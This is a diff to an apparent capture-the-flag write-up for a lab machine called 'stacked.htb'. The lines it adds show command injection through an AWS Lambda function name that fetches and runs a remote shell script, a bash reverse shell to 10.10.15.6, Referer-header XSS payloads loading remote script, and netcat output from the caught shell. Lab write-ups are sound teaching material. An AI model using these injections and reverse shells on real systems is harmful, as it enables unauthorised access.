@@ -306,6 +306,48 @@ $ tcpdump -i tun0 icmp
 $ aws lambda create-function --function-name 'ex; ping -c 1 10.10.15.6' --zip-file fileb://index.zip --role arn:aws:iam::123456789012:role/lambda-role --endpoint-url http://s3-testing.stacked.htb --handler index.handler --runtime nodejs12.x
 ````
 
+````
+`tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+07:50:49.770734 IP stacked.htb > 10.10.15.6: ICMP echo request, id 859, seq 1, length 64
+07:50:49.770760 IP 10.10.15.6 > stacked.htb: ICMP echo reply, id 859, seq 1, length 64
+
+07:54:49.595551 IP stacked.htb > 10.10.15.6: ICMP echo request, id 923, seq 1, length 64
+07:54:49.595577 IP 10.10.15.6 > stacked.htb: ICMP echo reply, id 923, seq 1, length 64
+````
+
+Shell
+````
+#!/bin/bash
+
+bash -i >& /dev/tcp/10.10.15.6/1337 0>&1
+````
+
+````
+Referer: <script src="http://10.10.15.6/xss-5.js"></script>
+````
+or 
+````
+Referer: <script>document.location="http://127.0.0.1:8080"</script>
+````
+
+````
+$ aws lambda create-function --function-name 'ex; wget 10.10.15.6/shell.sh -O /tmp/blah.sh; bash /tmp/blah.sh' --zip-file fileb://index.zip --role arn:aws:iam::123456789012:role/lambda-role --endpoint-url http://s3-testing.stacked.htb --handler index.handler --runtime nodejs12.x
+````
+
+````
+nc -nlvp 1337
+listening on [any] 1337 ...
+connect to [10.10.15.6] from (UNKNOWN) [10.10.11.112] 58568
+bash: cannot set terminal process group (19): Not a tty
+bash: no job control in this shell
+bash: /root/.bashrc: Permission denied
+bash-5.0$ id
+id
+uid=1001(localstack) gid=1001(localstack) groups=1001(localstack)
+````
+
+
 
 # Root
 
